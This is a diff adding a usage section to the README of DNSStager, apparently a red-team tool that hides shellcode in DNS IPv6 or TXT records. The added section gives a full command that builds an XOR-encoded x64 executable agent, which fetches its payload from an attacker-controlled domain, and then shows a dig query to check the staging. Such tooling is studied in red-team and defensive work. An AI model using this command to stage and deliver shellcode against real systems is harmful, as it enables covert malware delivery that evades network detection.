@@ -156,3 +156,17 @@ x64/golang/ipv6			Resolve your payload as IPV6 addresses encoded with custom key
 x86/golang/txt			Resolve your payload as TXT records encoded using base64 compiled x86 GoLang code
 x86/golang/ipv6			Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code
 ```
+## Example of using DNSStager with IPV6
+
+This example will start DNSStager to resolve your payload as `IPV6` using the domain `test.mydnsserver.live` with prefix `cloud-srv-` to generate compiled `x64 C` agent encoded with 0x10 as key:
+
+`sudo ./dnsstager.py --domain test.mydnsserver.live --payload x64/c/ipv6 --output /tmp/a2.exe --prefix cloud-srv- --shellcode_path ~/payload.bin --sleep 1 --xorkey 0x10
+`  
+
+And the output will be:
+
+![Alt text](screenshots/Starting-DNSStager-x64-ipv6.png)
+
+And to check if everything is working well, lets send DNS query to `cloud-srv-0.test.mydnsserver.live` to get the following:
+
+![Alt text](screenshots/DNSStager-dig-test.png)
